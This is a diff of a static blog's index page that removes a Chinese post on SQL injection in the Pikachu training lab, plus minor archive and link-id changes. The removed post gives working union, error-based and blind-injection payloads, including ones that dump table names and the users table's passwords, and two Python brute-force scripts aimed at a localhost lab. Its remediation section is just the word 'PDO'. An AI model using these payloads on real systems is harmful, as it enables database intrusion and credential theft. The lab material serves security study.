@@ -62,72 +62,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-pikachu-SQL注入漏洞源码分析及修复" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/09/27/pikachu-SQL注入漏洞源码分析及修复/" class="article-date">
-  <time datetime="2019-09-27T02:49:48.842Z" itemprop="datePublished">2019-09-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/27/pikachu-SQL注入漏洞源码分析及修复/">sql</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p><img src="https://img-blog.csdnimg.cn/20190909172702870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>小声：pikachu最后一篇,严重偷懒hh</p>
-<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>首先测试一下id=1’，报错信息：<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39; at line 1</code>，由此猜测是数字型注入，后台语句很有可能是<code>&quot;select ... from ... where id=某个数字&quot;</code><br>于是抓包改为<code>id=2 or 1=1</code>，这样使得where的条件永远为真</p>
-<p><img src="https://img-blog.csdnimg.cn/20190909173157806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到全部人的信息<br><img src="https://img-blog.csdnimg.cn/20190909172632262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==代码分析==<br>后端直接拼接了id参数，导致漏洞。<br><img src="https://img-blog.csdnimg.cn/20190909173356105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>输入1’测试一下，回显报错信息，猜测是字符型注入<br><img src="https://img-blog.csdnimg.cn/20190909174012384.png" alt="在这里插入图片描述"><br>构造<code>1’ or &#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/20190909174156526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>输入<code>-1&#39; union select 1,database()#</code>,暴库，进而可以暴表暴字段<br><img src="https://img-blog.csdnimg.cn/20190909174557311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==代码分析==<br><img src="https://img-blog.csdnimg.cn/20190910095845481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>测试一下输入数字<code>1</code>,回显出所有用户名中有1的，输入字母<code>l</code>，回显出用户名中所有有l的。于是猜测后台是like  %%查询。<br>后台语句可能为select … from … where username like ‘%用户输入%’<br>于是输入<code>%&#39;#</code>,查询出所有人的信息<br><img src="https://img-blog.csdnimg.cn/20190910092436910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>l%&#39; union select 1,2,database()#</code>,暴库<br><img src="https://img-blog.csdnimg.cn/20190910093051316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>输入<code>l%&#39; union select 1,2,table_name from information_schema.tables where table_schema=database()#</code>，暴表</p>
-<p><img src="https://img-blog.csdnimg.cn/2019091009345487.png" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20190910093403188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入<code>l%&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()#</code>，暴users表的列名</p>
-<p><img src="https://img-blog.csdnimg.cn/20190910094159850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>输入<code>l%&#39; union select 1,2,password from users#</code>，暴password列的值<br><img src="https://img-blog.csdnimg.cn/20190910094536564.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==代码分析==</p>
-<p><img src="https://img-blog.csdnimg.cn/20190910100210857.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>测试以下输入<code>lucy&#39;</code>，报错回显<code>You have an error in your SQL syntax; check the manual that corresponds 
-to your MySQL server version for the right syntax to use near &#39;&#39;lucy&#39;&#39;)&#39;
- at line 1</code>，可猜测后台语句<br> <code>select .. from .. where ..=(&#39;用户输入&#39;)</code></p>
-<p>输入<code>-1&#39;) union select 1,database()#</code>暴库<br><img src="https://img-blog.csdnimg.cn/20190910101707706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==代码分析==<br><img src="https://img-blog.csdnimg.cn/20190910103440471.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h2><p>输入<code>d &#39; or updatexml(1,concat(0x7e,concat(database(),0x7e)),0) or &#39;</code>，暴库</p>
-<p><img src="https://img-blog.csdnimg.cn/20190910110415110.png" alt="在这里插入图片描述"><br>==代码分析==<br><img src="https://img-blog.csdnimg.cn/20190910110840214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p><img src="https://img-blog.csdnimg.cn/20190910112650252.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">==代码分析==<br><img src="https://img-blog.csdnimg.cn/2019091011280322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p>把头信息回显出来，猜测可能是header注入<br><img src="https://img-blog.csdnimg.cn/20190910113323887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>暴库<br><img src="https://img-blog.csdnimg.cn/20190910184740302.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>==代码分析==<br><img src="https://img-blog.csdnimg.cn/20190910185108852.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="盲注（base-on-boolean）"><a href="#盲注（base-on-boolean）" class="headerlink" title="盲注（base on boolean）"></a>盲注（base on boolean）</h2><p>暴数据库名的长度</p>
-<p><img src="https://img-blog.csdnimg.cn/20190910201020843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">'http://localhost/pikachu/vul/sqli/sqli_blind_b.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    hurl=url+<span class="string">"?name=lucy' and length(database())&gt;=&#123;0&#125;--+&amp;submit=查询"</span>.format(i)</span><br><span class="line">    r=requests.get(hurl)</span><br><span class="line">    m=r.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'email'</span> <span class="keyword">in</span> m:</span><br><span class="line">        print(hurl)</span><br><span class="line">        print(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>暴库暴表等脚本下次来补<br>==代码分析==<br>没有报错回显，但根据参数的boolean值有页面显示的区别，适合盲注</p>
-<p><img src="https://img-blog.csdnimg.cn/2019091020143440.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h2><p>暴数据库名的长度<br><img src="https://img-blog.csdnimg.cn/20190910202728901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>py脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#for i in range(1,30):</span></span><br><span class="line">url=<span class="string">'http://localhost/pikachu/vul/sqli/sqli_blind_t.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    startTime=time.time()</span><br><span class="line">    hurl=url+<span class="string">"?name=lucy' and if(length(database())&gt;=&#123;0&#125;,1,sleep(10))--+&amp;submit=查询"</span>.format(i)</span><br><span class="line">    r=requests.get(hurl)</span><br><span class="line">    m=r.text</span><br><span class="line">    <span class="keyword">if</span> time.time()-startTime&lt;<span class="number">8</span>:</span><br><span class="line">        print(hurl)</span><br><span class="line">        print(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
-<p>暴库暴表等脚本下次来补<br>==代码分析==<br>报错不回显，参数变化显示页面也一样，适合时间盲注<br><img src="https://img-blog.csdnimg.cn/20190910204604704.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><img src="https://img-blog.csdnimg.cn/20190910204529157.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20190910204838966.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>原理不赘述，转这里：<a href="https://www.jianshu.com/p/4fe931da9550" target="_blank" rel="noopener">https://www.jianshu.com/p/4fe931da9550</a><br>==代码分析==<br>虽然有转义，但是因为编码是gbk<br><img src="https://img-blog.csdnimg.cn/20190910205018513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MTY1MjEyOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>PDO</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/09/27/pikachu-SQL注入漏洞源码分析及修复/" data-id="ck11jevvu0000psulxb6rehqv" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
     <article id="post-hello-world" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
     <a href="/2018/11/28/hello-world/" class="article-date">
@@ -163,7 +97,7 @@ to your MySQL server version for the right syntax to use near &#39;&#39;lucy&#39
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/11/28/hello-world/" data-id="cjp86vhqb0000dkulv3pqvsx8" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2018/11/28/hello-world/" data-id="ck11jku0l0000eoul85d9c6cm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -191,7 +125,7 @@ to your MySQL server version for the right syntax to use near &#39;&#39;lucy&#39
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li></ul>
     </div>
   </div>
 
@@ -202,10 +136,6 @@ to your MySQL server version for the right syntax to use near &#39;&#39;lucy&#39
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
-        
-          <li>
-            <a href="/2019/09/27/pikachu-SQL注入漏洞源码分析及修复/">sql</a>
-          </li>
         
           <li>
             <a href="/2018/11/28/hello-world/">Hello World</a>
